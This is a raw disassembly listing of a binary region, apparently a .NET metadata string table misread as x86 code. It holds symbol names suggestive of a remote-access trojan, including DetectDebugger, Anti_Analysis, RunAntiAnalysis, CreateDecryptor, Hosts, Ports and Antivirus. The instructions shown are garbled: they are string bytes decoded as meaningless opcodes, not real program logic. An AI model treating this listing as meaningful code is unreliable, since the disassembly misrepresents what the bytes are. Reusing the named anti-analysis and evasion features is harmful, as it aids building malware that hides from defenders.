  408beb:	67 65 74 5f          	addr16 gs je 0x408c4e
  408bef:	41                   	inc    %ecx
  408bf0:	73 49                	jae    0x408c3b
  408bf2:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf3:	74 65                	je     0x408c5a
  408bf5:	67 65 72 00          	addr16 gs jb 0x408bf9
  408bf9:	73 65                	jae    0x408c60
  408bfb:	74 5f                	je     0x408c5c
  408bfd:	41                   	inc    %ecx
  408bfe:	73 49                	jae    0x408c49
  408c00:	6e                   	outsb  %ds:(%esi),(%dx)
  408c01:	74 65                	je     0x408c68
  408c03:	67 65 72 00          	addr16 gs jb 0x408c07
  408c07:	47                   	inc    %edi
  408c08:	65 74 41             	gs je  0x408c4c
  408c0b:	73 49                	jae    0x408c56
  408c0d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c0e:	74 65                	je     0x408c75
  408c10:	67 65 72 00          	addr16 gs jb 0x408c14
  408c14:	53                   	push   %ebx
  408c15:	65 74 41             	gs je  0x408c59
  408c18:	73 49                	jae    0x408c63
  408c1a:	6e                   	outsb  %ds:(%esi),(%dx)
  408c1b:	74 65                	je     0x408c82
  408c1d:	67 65 72 00          	addr16 gs jb 0x408c21
  408c21:	44                   	inc    %esp
  408c22:	65 74 65             	gs je  0x408c8a
  408c25:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c29:	62 75 67             	bound  %esi,0x67(%ebp)
  408c2c:	67 65 72 00          	addr16 gs jb 0x408c30
  408c30:	4d                   	dec    %ebp
  408c31:	61                   	popa
  408c32:	6e                   	outsb  %ds:(%esi),(%dx)
  408c33:	61                   	popa
  408c34:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c37:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c39:	74 4f                	je     0x408c8a
  408c3b:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c3e:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c42:	61                   	popa
  408c43:	72 63                	jb     0x408ca8
  408c45:	68 65 72 00 53       	push   $0x53007265
  408c4a:	65 73 73             	gs jae 0x408cc0
  408c4d:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c54:	6e                   	outsb  %ds:(%esi),(%dx)
  408c55:	67 45                	addr16 inc %ebp
  408c57:	76 65                	jbe    0x408cbe
  408c59:	6e                   	outsb  %ds:(%esi),(%dx)
  408c5a:	74 48                	je     0x408ca4
  408c5c:	61                   	popa
  408c5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c5e:	64 6c                	fs insb (%dx),%es:(%edi)
  408c60:	65 72 00             	gs jb  0x408c63
  408c63:	54                   	push   %esp
  408c64:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c6b:	6e                   	outsb  %ds:(%esi),(%dx)
  408c6c:	65 72 00             	gs jb  0x408c6f
  408c6f:	43                   	inc    %ebx
  408c70:	6c                   	insb   (%dx),%es:(%edi)
  408c71:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c78:	6c                   	insb   (%dx),%es:(%edi)
  408c79:	70 65                	jo     0x408ce0
  408c7b:	72 00                	jb     0x408c7d
  408c7d:	54                   	push   %esp
  408c7e:	6f                   	outsl  %ds:(%esi),(%dx)
  408c7f:	55                   	push   %ebp
  408c80:	70 70                	jo     0x408cf2
  408c82:	65 72 00             	gs jb  0x408c85
  408c85:	44                   	inc    %esp
  408c86:	65 74 65             	gs je  0x408cee
  408c89:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c8d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c8e:	75 66                	jne    0x408cf6
  408c90:	61                   	popa
  408c91:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c95:	65 72 00             	gs jb  0x408c98
  408c98:	43                   	inc    %ebx
  408c99:	75 72                	jne    0x408d0d
  408c9b:	72 65                	jb     0x408d02
  408c9d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c9e:	74 55                	je     0x408cf5
  408ca0:	73 65                	jae    0x408d07
  408ca2:	72 00                	jb     0x408ca4
  408ca4:	53                   	push   %ebx
  408ca5:	74 72                	je     0x408d19
  408ca7:	65 61                	gs popa
  408ca9:	6d                   	insl   (%dx),%es:(%edi)
  408caa:	57                   	push   %edi
  408cab:	72 69                	jb     0x408d16
  408cad:	74 65                	je     0x408d14
  408caf:	72 00                	jb     0x408cb1
  408cb1:	54                   	push   %esp
  408cb2:	65 78 74             	gs js  0x408d29
  408cb5:	57                   	push   %edi
  408cb6:	72 69                	jb     0x408d21
  408cb8:	74 65                	je     0x408d1f
  408cba:	72 00                	jb     0x408cbc
  408cbc:	45                   	inc    %ebp
  408cbd:	6e                   	outsb  %ds:(%esi),(%dx)
  408cbe:	74 65                	je     0x408d25
  408cc0:	72 00                	jb     0x408cc2
  408cc2:	42                   	inc    %edx
  408cc3:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408cca:	72 
  408ccb:	74 65                	je     0x408d32
  408ccd:	72 00                	jb     0x408ccf
  408ccf:	54                   	push   %esp
  408cd0:	6f                   	outsl  %ds:(%esi),(%dx)
  408cd1:	4c                   	dec    %esp
  408cd2:	6f                   	outsl  %ds:(%esi),(%dx)
  408cd3:	77 65                	ja     0x408d3a
  408cd5:	72 00                	jb     0x408cd7
  408cd7:	45                   	inc    %ebp
  408cd8:	72 72                	jb     0x408d4c
  408cda:	6f                   	outsl  %ds:(%esi),(%dx)
  408cdb:	72 00                	jb     0x408cdd
  408cdd:	49                   	dec    %ecx
  408cde:	45                   	inc    %ebp
  408cdf:	6e                   	outsb  %ds:(%esi),(%dx)
  408ce0:	75 6d                	jne    0x408d4f
  408ce2:	65 72 61             	gs jb  0x408d46
  408ce5:	74 6f                	je     0x408d56
  408ce7:	72 00                	jb     0x408ce9
  408ce9:	4d                   	dec    %ebp
  408cea:	61                   	popa
  408ceb:	6e                   	outsb  %ds:(%esi),(%dx)
  408cec:	61                   	popa
  408ced:	67 65 6d             	gs insl (%dx),%es:(%di)
  408cf0:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cf2:	74 4f                	je     0x408d43
  408cf4:	62 6a 65             	bound  %ebp,0x65(%edx)
  408cf7:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408cfb:	75 6d                	jne    0x408d6a
  408cfd:	65 72 61             	gs jb  0x408d61
  408d00:	74 6f                	je     0x408d71
  408d02:	72 00                	jb     0x408d04
  408d04:	53                   	push   %ebx
  408d05:	79 73                	jns    0x408d7a
  408d07:	74 65                	je     0x408d6e
  408d09:	6d                   	insl   (%dx),%es:(%edi)
  408d0a:	2e 43                	cs inc %ebx
  408d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d0d:	6c                   	insb   (%dx),%es:(%edi)
  408d0e:	6c                   	insb   (%dx),%es:(%edi)
  408d0f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408d14:	6e                   	outsb  %ds:(%esi),(%dx)
  408d15:	73 2e                	jae    0x408d45
  408d17:	49                   	dec    %ecx
  408d18:	45                   	inc    %ebp
  408d19:	6e                   	outsb  %ds:(%esi),(%dx)
  408d1a:	75 6d                	jne    0x408d89
  408d1c:	65 72 61             	gs jb  0x408d80
  408d1f:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d23:	47                   	inc    %edi
  408d24:	65 74 45             	gs je  0x408d6c
  408d27:	6e                   	outsb  %ds:(%esi),(%dx)
  408d28:	75 6d                	jne    0x408d97
  408d2a:	65 72 61             	gs jb  0x408d8e
  408d2d:	74 6f                	je     0x408d9e
  408d2f:	72 00                	jb     0x408d31
  408d31:	41                   	inc    %ecx
  408d32:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d36:	61                   	popa
  408d37:	74 6f                	je     0x408da8
  408d39:	72 00                	jb     0x408d3b
  408d3b:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d40:	00 2e                	add    %ch,(%esi)
  408d42:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d45:	6f                   	outsl  %ds:(%esi),(%dx)
  408d46:	72 00                	jb     0x408d48
  408d48:	4d                   	dec    %ebp
  408d49:	6f                   	outsl  %ds:(%esi),(%dx)
  408d4a:	6e                   	outsb  %ds:(%esi),(%dx)
  408d4b:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d52:	65 
  408d53:	61                   	popa
  408d54:	74 65                	je     0x408dbb
  408d56:	44                   	inc    %esp
  408d57:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d5b:	70 74                	jo     0x408dd1
  408d5d:	6f                   	outsl  %ds:(%esi),(%dx)
  408d5e:	72 00                	jb     0x408d60
  408d60:	43                   	inc    %ebx
  408d61:	72 65                	jb     0x408dc8
  408d63:	61                   	popa
  408d64:	74 65                	je     0x408dcb
  408d66:	45                   	inc    %ebp
  408d67:	6e                   	outsb  %ds:(%esi),(%dx)
  408d68:	63 72 79             	arpl   %esi,0x79(%edx)
  408d6b:	70 74                	jo     0x408de1
  408d6d:	6f                   	outsl  %ds:(%esi),(%dx)
  408d6e:	72 00                	jb     0x408d70
  408d70:	49                   	dec    %ecx
  408d71:	6e                   	outsb  %ds:(%esi),(%dx)
  408d72:	74 50                	je     0x408dc4
  408d74:	74 72                	je     0x408de8
  408d76:	00 53 79             	add    %dl,0x79(%ebx)
  408d79:	73 74                	jae    0x408def
  408d7b:	65 6d                	gs insl (%dx),%es:(%edi)
  408d7d:	2e 44                	cs inc %esp
  408d7f:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d86:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d8d:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d94:	6f                   	outsl  %ds:(%esi),(%dx)
  408d95:	64 73 00             	fs jae 0x408d98
  408d98:	4d                   	dec    %ebp
  408d99:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408da0:	74 2e                	je     0x408dd0
  408da2:	56                   	push   %esi
  408da3:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408daa:	73 69                	jae    0x408e15
  408dac:	63 2e                	arpl   %ebp,(%esi)
  408dae:	44                   	inc    %esp
  408daf:	65 76 69             	gs jbe 0x408e1b
  408db2:	63 65 73             	arpl   %esp,0x73(%ebp)
  408db5:	00 53 79             	add    %dl,0x79(%ebx)
  408db8:	73 74                	jae    0x408e2e
  408dba:	65 6d                	gs insl (%dx),%es:(%edi)
  408dbc:	2e 52                	cs push %edx
  408dbe:	75 6e                	jne    0x408e2e
  408dc0:	74 69                	je     0x408e2b
  408dc2:	6d                   	insl   (%dx),%es:(%edi)
  408dc3:	65 2e 49             	gs cs dec %ecx
  408dc6:	6e                   	outsb  %ds:(%esi),(%dx)
  408dc7:	74 65                	je     0x408e2e
  408dc9:	72 6f                	jb     0x408e3a
  408dcb:	70 53                	jo     0x408e20
  408dcd:	65 72 76             	gs jb  0x408e46
  408dd0:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408dd7:	73 74                	jae    0x408e4d
  408dd9:	65 6d                	gs insl (%dx),%es:(%edi)
  408ddb:	2e 52                	cs push %edx
  408ddd:	75 6e                	jne    0x408e4d
  408ddf:	74 69                	je     0x408e4a
  408de1:	6d                   	insl   (%dx),%es:(%edi)
  408de2:	65 2e 43             	gs cs inc %ebx
  408de5:	6f                   	outsl  %ds:(%esi),(%dx)
  408de6:	6d                   	insl   (%dx),%es:(%edi)
  408de7:	70 69                	jo     0x408e52
  408de9:	6c                   	insb   (%dx),%es:(%edi)
  408dea:	65 72 53             	gs jb  0x408e40
  408ded:	65 72 76             	gs jb  0x408e66
  408df0:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408df7:	62 75 67             	bound  %esi,0x67(%ebp)
  408dfa:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408e01:	65 
  408e02:	73 00                	jae    0x408e04
  408e04:	45                   	inc    %ebp
  408e05:	78 70                	js     0x408e77
  408e07:	61                   	popa
  408e08:	6e                   	outsb  %ds:(%esi),(%dx)
  408e09:	64 45                	fs inc %ebp
  408e0b:	6e                   	outsb  %ds:(%esi),(%dx)
  408e0c:	76 69                	jbe    0x408e77
  408e0e:	72 6f                	jb     0x408e7f
  408e10:	6e                   	outsb  %ds:(%esi),(%dx)
  408e11:	6d                   	insl   (%dx),%es:(%edi)
  408e12:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e14:	74 56                	je     0x408e6c
  408e16:	61                   	popa
  408e17:	72 69                	jb     0x408e82
  408e19:	61                   	popa
  408e1a:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408e1e:	00 47 65             	add    %al,0x65(%edi)
  408e21:	74 50                	je     0x408e73
  408e23:	72 6f                	jb     0x408e94
  408e25:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e28:	73 65                	jae    0x408e8f
  408e2a:	73 00                	jae    0x408e2c
  408e2c:	47                   	inc    %edi
  408e2d:	65 74 48             	gs je  0x408e78
  408e30:	6f                   	outsl  %ds:(%esi),(%dx)
  408e31:	73 74                	jae    0x408ea7
  408e33:	41                   	inc    %ecx
  408e34:	64 64 72 65          	fs fs jb 0x408e9d
  408e38:	73 73                	jae    0x408ead
  408e3a:	65 73 00             	gs jae 0x408e3d
  408e3d:	53                   	push   %ebx
  408e3e:	79 73                	jns    0x408eb3
  408e40:	74 65                	je     0x408ea7
  408e42:	6d                   	insl   (%dx),%es:(%edi)
  408e43:	2e 53                	cs push %ebx
  408e45:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e49:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e50:	70 
  408e51:	74 6f                	je     0x408ec2
  408e53:	67 72 61             	addr16 jb 0x408eb7
  408e56:	70 68                	jo     0x408ec0
  408e58:	79 2e                	jns    0x408e88
  408e5a:	58                   	pop    %eax
  408e5b:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e60:	72 74                	jb     0x408ed6
  408e62:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e69:	73 00                	jae    0x408e6b
  408e6b:	45                   	inc    %ebp
  408e6c:	6e                   	outsb  %ds:(%esi),(%dx)
  408e6d:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e70:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e74:	74 65                	je     0x408edb
  408e76:	73 00                	jae    0x408e78
  408e78:	47                   	inc    %edi
  408e79:	65 74 55             	gs je  0x408ed1
  408e7c:	74 66                	je     0x408ee4
  408e7e:	38 42 79             	cmp    %al,0x79(%edx)
  408e81:	74 65                	je     0x408ee8
  408e83:	73 00                	jae    0x408e85
  408e85:	75 74                	jne    0x408efb
  408e87:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e8b:	74 65                	je     0x408ef2
  408e8d:	73 00                	jae    0x408e8f
  408e8f:	52                   	push   %edx
  408e90:	66 63 32             	arpl   %si,(%edx)
  408e93:	38 39                	cmp    %bh,(%ecx)
  408e95:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e99:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408ea0:	73 00                	jae    0x408ea2
  408ea2:	52                   	push   %edx
  408ea3:	65 61                	gs popa
  408ea5:	64 41                	fs inc %ecx
  408ea7:	6c                   	insb   (%dx),%es:(%edi)
  408ea8:	6c                   	insb   (%dx),%es:(%edi)
  408ea9:	42                   	inc    %edx
  408eaa:	79 74                	jns    0x408f20
  408eac:	65 73 00             	gs jae 0x408eaf
  408eaf:	44                   	inc    %esp
  408eb0:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408eb4:	65 46                	gs inc %esi
  408eb6:	72 6f                	jb     0x408f27
  408eb8:	6d                   	insl   (%dx),%es:(%edi)
  408eb9:	42                   	inc    %edx
  408eba:	79 74                	jns    0x408f30
  408ebc:	65 73 00             	gs jae 0x408ebf
  408ebf:	53                   	push   %ebx
  408ec0:	77 61                	ja     0x408f23
  408ec2:	70 42                	jo     0x408f06
  408ec4:	79 74                	jns    0x408f3a
  408ec6:	65 73 00             	gs jae 0x408ec9
  408ec9:	4c                   	dec    %esp
  408eca:	6f                   	outsl  %ds:(%esi),(%dx)
  408ecb:	61                   	popa
  408ecc:	64 46                	fs inc %esi
  408ece:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408ed5:	74 
  408ed6:	65 73 00             	gs jae 0x408ed9
  408ed9:	47                   	inc    %edi
  408eda:	65 74 41             	gs je  0x408f1e
  408edd:	73 42                	jae    0x408f21
  408edf:	79 74                	jns    0x408f55
  408ee1:	65 73 00             	gs jae 0x408ee4
  408ee4:	53                   	push   %ebx
  408ee5:	65 74 41             	gs je  0x408f29
  408ee8:	73 42                	jae    0x408f2c
  408eea:	79 74                	jns    0x408f60
  408eec:	65 73 00             	gs jae 0x408eef
  408eef:	47                   	inc    %edi
  408ef0:	65 74 42             	gs je  0x408f35
  408ef3:	79 74                	jns    0x408f69
  408ef5:	65 73 00             	gs jae 0x408ef8
  408ef8:	72 61                	jb     0x408f5b
  408efa:	77 42                	ja     0x408f3e
  408efc:	79 74                	jns    0x408f72
  408efe:	65 73 00             	gs jae 0x408f01
  408f01:	62 79 74             	bound  %edi,0x74(%ecx)
  408f04:	65 73 00             	gs jae 0x408f07
  408f07:	43                   	inc    %ebx
  408f08:	53                   	push   %ebx
  408f09:	68 61 72 70 41       	push   $0x41707261
  408f0e:	72 67                	jb     0x408f77
  408f10:	75 6d                	jne    0x408f7f
  408f12:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f14:	74 49                	je     0x408f5f
  408f16:	6e                   	outsb  %ds:(%esi),(%dx)
  408f17:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f19:	46                   	inc    %esi
  408f1a:	6c                   	insb   (%dx),%es:(%edi)
  408f1b:	61                   	popa
  408f1c:	67 73 00             	addr16 jae 0x408f1f
  408f1f:	43                   	inc    %ebx
  408f20:	53                   	push   %ebx
  408f21:	68 61 72 70 42       	push   $0x42707261
  408f26:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f2d:	61                   	popa
  408f2e:	67 73 00             	addr16 jae 0x408f31
  408f31:	65 73 46             	gs jae 0x408f7a
  408f34:	6c                   	insb   (%dx),%es:(%edi)
  408f35:	61                   	popa
  408f36:	67 73 00             	addr16 jae 0x408f39
  408f39:	53                   	push   %ebx
  408f3a:	74 72                	je     0x408fae
  408f3c:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f43:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f4a:	65 
  408f4b:	53                   	push   %ebx
  408f4c:	65 74 74             	gs je  0x408fc3
  408f4f:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f56:	73 73                	jae    0x408fcb
  408f58:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f5f:	6e                   	outsb  %ds:(%esi),(%dx)
  408f60:	67 45                	addr16 inc %ebp
  408f62:	76 65                	jbe    0x408fc9
  408f64:	6e                   	outsb  %ds:(%esi),(%dx)
  408f65:	74 41                	je     0x408fa8
  408f67:	72 67                	jb     0x408fd0
  408f69:	73 00                	jae    0x408f6b
  408f6b:	41                   	inc    %ecx
  408f6c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6d:	74 69                	je     0x408fd8
  408f6f:	5f                   	pop    %edi
  408f70:	41                   	inc    %ecx
  408f71:	6e                   	outsb  %ds:(%esi),(%dx)
  408f72:	61                   	popa
  408f73:	6c                   	insb   (%dx),%es:(%edi)
  408f74:	79 73                	jns    0x408fe9
  408f76:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f7d:	6e                   	outsb  %ds:(%esi),(%dx)
  408f7e:	74 69                	je     0x408fe9
  408f80:	41                   	inc    %ecx
  408f81:	6e                   	outsb  %ds:(%esi),(%dx)
  408f82:	61                   	popa
  408f83:	6c                   	insb   (%dx),%es:(%edi)
  408f84:	79 73                	jns    0x408ff9
  408f86:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f8d:	73 00                	jae    0x408f8f
  408f8f:	49                   	dec    %ecx
  408f90:	43                   	inc    %ebx
  408f91:	72 65                	jb     0x408ff8
  408f93:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f96:	74 69                	je     0x409001
  408f98:	61                   	popa
  408f99:	6c                   	insb   (%dx),%es:(%edi)
  408f9a:	73 00                	jae    0x408f9c
  408f9c:	73 65                	jae    0x409003
  408f9e:	74 5f                	je     0x408fff
  408fa0:	43                   	inc    %ebx
  408fa1:	72 65                	jb     0x409008
  408fa3:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408fa6:	74 69                	je     0x409011
  408fa8:	61                   	popa
  408fa9:	6c                   	insb   (%dx),%es:(%edi)
  408faa:	73 00                	jae    0x408fac
  408fac:	45                   	inc    %ebp
  408fad:	71 75                	jno    0x409024
  408faf:	61                   	popa
  408fb0:	6c                   	insb   (%dx),%es:(%edi)
  408fb1:	73 00                	jae    0x408fb3
  408fb3:	53                   	push   %ebx
  408fb4:	73 6c                	jae    0x409022
  408fb6:	50                   	push   %eax
  408fb7:	72 6f                	jb     0x409028
  408fb9:	74 6f                	je     0x40902a
  408fbb:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408fbe:	73 00                	jae    0x408fc0
  408fc0:	52                   	push   %edx
  408fc1:	65 61                	gs popa
  408fc3:	64 54                	fs push %esp
  408fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc6:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc7:	6c                   	insb   (%dx),%es:(%edi)
  408fc8:	73 00                	jae    0x408fca
  408fca:	57                   	push   %edi
  408fcb:	72 69                	jb     0x409036
  408fcd:	74 65                	je     0x409034
  408fcf:	54                   	push   %esp
  408fd0:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd1:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd2:	6c                   	insb   (%dx),%es:(%edi)
  408fd3:	73 00                	jae    0x408fd5
  408fd5:	42                   	inc    %edx
  408fd6:	79 74                	jns    0x40904c
  408fd8:	65 73 54             	gs jae 0x40902f
  408fdb:	6f                   	outsl  %ds:(%esi),(%dx)
  408fdc:	6f                   	outsl  %ds:(%esi),(%dx)
  408fdd:	6c                   	insb   (%dx),%es:(%edi)
  408fde:	73 00                	jae    0x408fe0
  408fe0:	53                   	push   %ebx
  408fe1:	79 73                	jns    0x409056
  408fe3:	74 65                	je     0x40904a
  408fe5:	6d                   	insl   (%dx),%es:(%edi)
  408fe6:	2e 57                	cs push %edi
  408fe8:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fef:	46                   	inc    %esi
  408ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  408ff1:	72 6d                	jb     0x409060
  408ff3:	73 00                	jae    0x408ff5
  408ff5:	44                   	inc    %esp
  408ff6:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff7:	73 00                	jae    0x408ff9
  408ff9:	43                   	inc    %ebx
  408ffa:	6f                   	outsl  %ds:(%esi),(%dx)
  408ffb:	6e                   	outsb  %ds:(%esi),(%dx)
  408ffc:	74 61                	je     0x40905f
  408ffe:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  409005:	74 65                	je     0x40906c
  409007:	6d                   	insl   (%dx),%es:(%edi)
  409008:	2e 43                	cs inc %ebx
  40900a:	6f                   	outsl  %ds:(%esi),(%dx)
  40900b:	6c                   	insb   (%dx),%es:(%edi)
  40900c:	6c                   	insb   (%dx),%es:(%edi)
  40900d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409012:	6e                   	outsb  %ds:(%esi),(%dx)
  409013:	73 00                	jae    0x409015
  409015:	53                   	push   %ebx
  409016:	74 72                	je     0x40908a
  409018:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  40901f:	74 4f                	je     0x409070
  409021:	70 74                	jo     0x409097
  409023:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  40902a:	74 49                	je     0x409075
  40902c:	6d                   	insl   (%dx),%es:(%edi)
  40902d:	61                   	popa
  40902e:	67 65 44             	addr16 gs inc %esp
  409031:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409035:	65 72 73             	gs jb  0x4090ab
  409038:	00 52 75             	add    %dl,0x75(%edx)
  40903b:	6e                   	outsb  %ds:(%esi),(%dx)
  40903c:	74 69                	je     0x4090a7
  40903e:	6d                   	insl   (%dx),%es:(%edi)
  40903f:	65 48                	gs dec %eax
  409041:	65 6c                	gs insb (%dx),%es:(%edi)
  409043:	70 65                	jo     0x4090aa
  409045:	72 73                	jb     0x4090ba
  409047:	00 53 73             	add    %dl,0x73(%ebx)
  40904a:	6c                   	insb   (%dx),%es:(%edi)
  40904b:	50                   	push   %eax
  40904c:	6f                   	outsl  %ds:(%esi),(%dx)
  40904d:	6c                   	insb   (%dx),%es:(%edi)
  40904e:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409055:	72 73                	jb     0x4090ca
  409057:	00 73 73             	add    %dh,0x73(%ebx)
  40905a:	6c                   	insb   (%dx),%es:(%edi)
  40905b:	50                   	push   %eax
  40905c:	6f                   	outsl  %ds:(%esi),(%dx)
  40905d:	6c                   	insb   (%dx),%es:(%edi)
  40905e:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409065:	72 73                	jb     0x4090da
  409067:	00 46 69             	add    %al,0x69(%esi)
  40906a:	6c                   	insb   (%dx),%es:(%edi)
  40906b:	65 41                	gs inc %ecx
  40906d:	63 63 65             	arpl   %esp,0x65(%ebx)
  409070:	73 73                	jae    0x4090e5
  409072:	00 68 50             	add    %ch,0x50(%eax)
  409075:	72 6f                	jb     0x4090e6
  409077:	63 65 73             	arpl   %esp,0x73(%ebp)
  40907a:	73 00                	jae    0x40907c
  40907c:	47                   	inc    %edi
  40907d:	65 74 43             	gs je  0x4090c3
  409080:	75 72                	jne    0x4090f4
  409082:	72 65                	jb     0x4090e9
  409084:	6e                   	outsb  %ds:(%esi),(%dx)
  409085:	74 50                	je     0x4090d7
  409087:	72 6f                	jb     0x4090f8
  409089:	63 65 73             	arpl   %esp,0x73(%ebp)
  40908c:	73 00                	jae    0x40908e
  40908e:	49                   	dec    %ecx
  40908f:	50                   	push   %eax
  409090:	41                   	inc    %ecx
  409091:	64 64 72 65          	fs fs jb 0x4090fa
  409095:	73 73                	jae    0x40910a
  409097:	00 43 6f             	add    %al,0x6f(%ebx)
  40909a:	6d                   	insl   (%dx),%es:(%edi)
  40909b:	70 72                	jo     0x40910f
  40909d:	65 73 73             	gs jae 0x409113
  4090a0:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4090a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a5:	6d                   	insl   (%dx),%es:(%edi)
  4090a6:	70 72                	jo     0x40911a
  4090a8:	65 73 73             	gs jae 0x40911e
  4090ab:	00 53 79             	add    %dl,0x79(%ebx)
  4090ae:	73 74                	jae    0x409124
  4090b0:	65 6d                	gs insl (%dx),%es:(%edi)
  4090b2:	2e 4e                	cs dec %esi
  4090b4:	65 74 2e             	gs je  0x4090e5
  4090b7:	53                   	push   %ebx
  4090b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4090b9:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4090bc:	74 73                	je     0x409131
  4090be:	00 73 65             	add    %dh,0x65(%ebx)
  4090c1:	74 5f                	je     0x409122
  4090c3:	41                   	inc    %ecx
  4090c4:	72 67                	jb     0x40912d
  4090c6:	75 6d                	jne    0x409135
  4090c8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090ca:	74 73                	je     0x40913f
  4090cc:	00 53 79             	add    %dl,0x79(%ebx)
  4090cf:	73 74                	jae    0x409145
  4090d1:	65 6d                	gs insl (%dx),%es:(%edi)
  4090d3:	45                   	inc    %ebp
  4090d4:	76 65                	jbe    0x40913b
  4090d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d7:	74 73                	je     0x40914c
  4090d9:	00 50 6f             	add    %dl,0x6f(%eax)
  4090dc:	72 74                	jb     0x409152
  4090de:	73 00                	jae    0x4090e0
  4090e0:	45                   	inc    %ebp
  4090e1:	78 69                	js     0x40914c
  4090e3:	73 74                	jae    0x409159
  4090e5:	73 00                	jae    0x4090e7
  4090e7:	48                   	dec    %eax
  4090e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e9:	73 74                	jae    0x40915f
  4090eb:	73 00                	jae    0x4090ed
  4090ed:	41                   	inc    %ecx
  4090ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4090ef:	74 69                	je     0x40915a
  4090f1:	76 69                	jbe    0x40915c
  4090f3:	72 75                	jb     0x40916a
  4090f5:	73 00                	jae    0x4090f7
  4090f7:	43                   	inc    %ebx
